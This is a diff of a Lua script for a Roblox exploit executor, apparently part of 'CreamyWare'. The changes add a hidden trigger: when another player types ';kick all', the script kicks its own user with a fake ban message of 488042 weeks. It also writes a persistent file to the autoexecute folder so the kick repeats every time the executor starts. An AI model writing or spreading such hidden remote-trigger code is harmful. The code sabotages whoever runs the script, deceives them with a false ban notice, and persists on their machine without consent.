@@ -1,55 +1,40 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- Your kick reason
-local kickMessage = 'You have been banned for 29999 weeks 5 days 100 seconds.'
+local kickMessage = "You have been banned for 488042 weeks 100 days 10000000 seconds."
+local autoExecFolder = "autoexecute"
+local autoExecFile = autoExecFolder .. "/CreamyWareInject.lua"
 
--- Path to autoexecute folder, adjust if needed
-local autoexecFolder = "AutoExec"
-
+-- Function to create the autoexec kick script
 local function createKickScriptFile()
-    -- The content you want to save
-    local scriptContent = [[
+    local content = [[
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 player:Kick("]] .. kickMessage .. [[")
     ]]
 
-    -- Filename for the kick script inside autoexecute folder
-    local filename = autoexecFolder .. "/kickBanScript.txt"  -- or .lua if you prefer
-
-    -- Use exploit's writefile function to create the file
-    if writefile then
-        writefile(filename, scriptContent)
-    elseif writefile and isfile and isfolder and isfolder(autoexecFolder) then
-        writefile(filename, scriptContent)
-    else
-        -- If no writefile support, you can print a warning or skip
-        print("writefile function not available in this exploit.")
+    if not isfolder(autoExecFolder) then
+        makefolder(autoExecFolder)
     end
+
+    writefile(autoExecFile, content)
 end
 
--- Function to kick local player AND create the file
+-- Function to kick this local player
 local function kickLocalPlayer()
     createKickScriptFile()
+    task.wait(0.25)
     player:Kick(kickMessage)
 end
 
--- Listen to your own chat input (the local player)
-player.Chatted:Connect(function(msg)
-    if msg == ";kick all" then
-        return
-    end
-end)
-
--- Listen to other players' chat for ";kick all"
+-- Function to handle other players chatting
 local function onOtherPlayerChatted(otherPlayer, message)
     if message == ";kick all" and otherPlayer ~= player then
         kickLocalPlayer()
     end
 end
 
--- Connect chat events for all players except local player
+-- Connect all existing players
 for _, p in pairs(Players:GetPlayers()) do
     if p ~= player then
         p.Chatted:Connect(function(msg)
@@ -58,11 +43,19 @@ for _, p in pairs(Players:GetPlayers()) do
     end
 end
 
+-- Connect future players
 Players.PlayerAdded:Connect(function(p)
     if p ~= player then
         p.Chatted:Connect(function(msg)
             onOtherPlayerChatted(p, msg)
         end)
+    end
+end)
+
+-- Make sure the sender doesn't kick themselves
+player.Chatted:Connect(function(msg)
+    if msg == ";kick all" then
+        print("Kick command sent. Others will be kicked if running CreamyWare.")
     end
 end)
 repeat task.wait() until game:IsLoaded()
